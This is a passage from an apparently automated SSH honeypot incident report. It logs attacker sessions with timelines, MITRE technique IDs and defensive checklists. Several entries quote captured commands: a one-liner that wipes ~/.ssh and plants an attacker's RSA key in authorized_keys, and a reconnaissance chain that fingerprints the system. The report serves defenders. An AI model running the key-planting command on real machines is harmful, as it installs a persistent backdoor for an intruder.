| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:01:10` | `cowrie.session.connect` |
| `2026-08-01 14:01:10` | `cowrie.client.version` |
| `2026-08-01 14:01:10` | `cowrie.client.kex` |
| `2026-08-01 14:01:12` | `cowrie.login.success` |
| `2026-08-01 14:01:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:01:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:01:12` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:01:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7b59461f87

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:01 |
| **Last Seen** | 2026-08-01 14:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:01:56` | `cowrie.session.connect` |
| `2026-08-01 14:01:57` | `cowrie.client.version` |
| `2026-08-01 14:01:57` | `cowrie.client.kex` |
| `2026-08-01 14:01:57` | `cowrie.login.success` |
| `2026-08-01 14:01:59` | `cowrie.session.params` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.success` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.command.input` |
| `2026-08-01 14:01:59` | `cowrie.log.closed` |
| `2026-08-01 14:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da330bf17a31

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-08-01 14:02 |
| **Last Seen** | 2026-08-01 14:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:02:34` | `cowrie.session.connect` |
| `2026-08-01 14:02:34` | `cowrie.client.version` |
| `2026-08-01 14:02:34` | `cowrie.client.kex` |
| `2026-08-01 14:02:35` | `cowrie.login.success` |
| `2026-08-01 14:02:37` | `cowrie.session.params` |
| `2026-08-01 14:02:37` | `cowrie.command.input` |
| `2026-08-01 14:02:37` | `cowrie.command.failed` |
| `2026-08-01 14:02:37` | `cowrie.log.closed` |
| `2026-08-01 14:02:38` | `cowrie.session.params` |
| `2026-08-01 14:02:38` | `cowrie.command.input` |
| `2026-08-01 14:02:38` | `cowrie.session.file_download` |
| `2026-08-01 14:02:38` | `cowrie.log.closed` |
| `2026-08-01 14:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-400d85ab85bf

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-08-01 14:02 |
| **Last Seen** | 2026-08-01 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:02:39` | `cowrie.session.connect` |
| `2026-08-01 14:02:39` | `cowrie.client.version` |
| `2026-08-01 14:02:39` | `cowrie.client.kex` |
| `2026-08-01 14:02:40` | `cowrie.login.success` |
| `2026-08-01 14:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64358c62330

| Field | Detail |
|---|---|
| **Source IP** | `182.93.50[.]90` |
| **First Seen** | 2026-08-01 14:02 |
| **Last Seen** | 2026-08-01 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:02:40` | `cowrie.session.connect` |
| `2026-08-01 14:02:40` | `cowrie.client.version` |
| `2026-08-01 14:02:41` | `cowrie.client.kex` |
| `2026-08-01 14:02:42` | `cowrie.login.success` |
| `2026-08-01 14:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.50[.]90` to AbuseIPDB if not already reported
- [ ] Block `182.93.50[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c4185df8cc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:03 |
| **Last Seen** | 2026-08-01 14:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:03:33` | `cowrie.session.connect` |
| `2026-08-01 14:03:33` | `cowrie.client.version` |
| `2026-08-01 14:03:33` | `cowrie.client.kex` |
| `2026-08-01 14:03:34` | `cowrie.login.success` |
| `2026-08-01 14:03:35` | `cowrie.session.params` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.success` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.command.input` |
| `2026-08-01 14:03:35` | `cowrie.log.closed` |
| `2026-08-01 14:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1504d385614c

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:04 |
| **Last Seen** | 2026-08-01 14:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:04:20` | `cowrie.session.connect` |
| `2026-08-01 14:04:20` | `cowrie.client.version` |
| `2026-08-01 14:04:21` | `cowrie.client.kex` |
| `2026-08-01 14:04:22` | `cowrie.login.success` |
| `2026-08-01 14:04:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:04:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:04:23` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478e35658579

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:05 |
| **Last Seen** | 2026-08-01 14:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:05:12` | `cowrie.session.connect` |
| `2026-08-01 14:05:12` | `cowrie.client.version` |
| `2026-08-01 14:05:12` | `cowrie.client.kex` |
| `2026-08-01 14:05:13` | `cowrie.login.success` |
| `2026-08-01 14:05:14` | `cowrie.session.params` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.success` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.command.input` |
| `2026-08-01 14:05:14` | `cowrie.log.closed` |
| `2026-08-01 14:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d9dc3f3eb8a

| Field | Detail |
|---|---|
| **Source IP** | `116.110.144[.]94` |
| **First Seen** | 2026-08-01 14:05 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 67s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:05:26` | `cowrie.session.connect` |
| `2026-08-01 14:05:26` | `cowrie.client.version` |
| `2026-08-01 14:05:27` | `cowrie.client.kex` |
| `2026-08-01 14:05:56` | `cowrie.login.success` |
| `2026-08-01 14:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.144[.]94` to AbuseIPDB if not already reported
- [ ] Block `116.110.144[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e47ff3f2c4d

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-08-01 14:06 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:06:23` | `cowrie.session.connect` |
| `2026-08-01 14:06:23` | `cowrie.client.version` |
| `2026-08-01 14:06:23` | `cowrie.client.kex` |
| `2026-08-01 14:06:23` | `cowrie.login.success` |
| `2026-08-01 14:06:24` | `cowrie.session.params` |
| `2026-08-01 14:06:24` | `cowrie.command.input` |
| `2026-08-01 14:06:24` | `cowrie.command.failed` |
| `2026-08-01 14:06:24` | `cowrie.log.closed` |
| `2026-08-01 14:06:25` | `cowrie.session.params` |
| `2026-08-01 14:06:25` | `cowrie.command.input` |
| `2026-08-01 14:06:25` | `cowrie.session.file_download` |
| `2026-08-01 14:06:25` | `cowrie.log.closed` |
| `2026-08-01 14:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abbbd885920c

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-08-01 14:06 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:06:25` | `cowrie.session.connect` |
| `2026-08-01 14:06:25` | `cowrie.client.version` |
| `2026-08-01 14:06:25` | `cowrie.client.kex` |
| `2026-08-01 14:06:26` | `cowrie.login.success` |
| `2026-08-01 14:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-050f55ab4597

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-08-01 14:06 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:06:26` | `cowrie.session.connect` |
| `2026-08-01 14:06:26` | `cowrie.client.version` |
| `2026-08-01 14:06:26` | `cowrie.client.kex` |
| `2026-08-01 14:06:27` | `cowrie.login.success` |
| `2026-08-01 14:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3001c36474e8

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:06 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:06:43` | `cowrie.session.connect` |
| `2026-08-01 14:06:43` | `cowrie.client.version` |
| `2026-08-01 14:06:43` | `cowrie.client.kex` |
| `2026-08-01 14:06:45` | `cowrie.login.success` |
| `2026-08-01 14:06:46` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:06:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:06:46` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-640e59bc636c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:06 |
| **Last Seen** | 2026-08-01 14:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:06:49` | `cowrie.session.connect` |
| `2026-08-01 14:06:49` | `cowrie.client.version` |
| `2026-08-01 14:06:49` | `cowrie.client.kex` |
| `2026-08-01 14:06:50` | `cowrie.login.success` |
| `2026-08-01 14:06:52` | `cowrie.session.params` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.success` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.command.input` |
| `2026-08-01 14:06:52` | `cowrie.log.closed` |
| `2026-08-01 14:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7011ae480f49

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:08 |
| **Last Seen** | 2026-08-01 14:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:08:26` | `cowrie.session.connect` |
| `2026-08-01 14:08:26` | `cowrie.client.version` |
| `2026-08-01 14:08:26` | `cowrie.client.kex` |
| `2026-08-01 14:08:27` | `cowrie.login.success` |
| `2026-08-01 14:08:28` | `cowrie.session.params` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.success` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.command.input` |
| `2026-08-01 14:08:28` | `cowrie.log.closed` |
| `2026-08-01 14:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e9a8658404d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:10 |
| **Last Seen** | 2026-08-01 14:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:10:08` | `cowrie.session.connect` |
| `2026-08-01 14:10:08` | `cowrie.client.version` |
| `2026-08-01 14:10:08` | `cowrie.client.kex` |
| `2026-08-01 14:10:09` | `cowrie.login.success` |
| `2026-08-01 14:10:10` | `cowrie.session.params` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.success` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.command.input` |
| `2026-08-01 14:10:10` | `cowrie.log.closed` |
| `2026-08-01 14:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407c24fe5d81

| Field | Detail |
|---|---|
| **Source IP** | `116.110.151[.]49` |
| **First Seen** | 2026-08-01 14:10 |
| **Last Seen** | 2026-08-01 14:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 14:10:47` | `cowrie.session.connect` |
| `2026-08-01 14:10:47` | `cowrie.client.version` |
| `2026-08-01 14:10:48` | `cowrie.client.kex` |
| `2026-08-01 14:10:49` | `cowrie.login.success` |
| `2026-08-01 14:10:50` | `cowrie.direct-tcpip.request` |
| `2026-08-01 14:10:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-01 14:10:50` | `cowrie.direct-tcpip.data` |
| `2026-08-01 14:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.151[.]49` to AbuseIPDB if not already reported
- [ ] Block `116.110.151[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c363ee8b91b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 14:11 |
| **Last Seen** | 2026-08-01 14:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
